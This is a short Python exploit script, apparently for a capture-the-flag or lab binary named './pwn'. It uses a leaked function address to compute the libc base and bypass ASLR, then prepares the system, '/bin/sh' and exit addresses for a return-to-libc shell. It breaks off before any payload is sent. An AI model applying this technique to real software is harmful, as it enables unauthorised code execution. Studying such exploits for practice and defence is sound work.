#!/usr/bin/env python3
# ASLR Bypass with a function leak

elf = context.binary = ELF('./pwn')
libc = elf.libc
p = process()

p.recvuntil('function is at: ')
function_leak = int(p.recvline(), 16)

libc.address = function_leak - libc.sym['function']

system = p64(libc.sym['system'])
sh = p64(next(libc.search(b"/bin/sh")))
exit = p64(libc.sym['exit'])
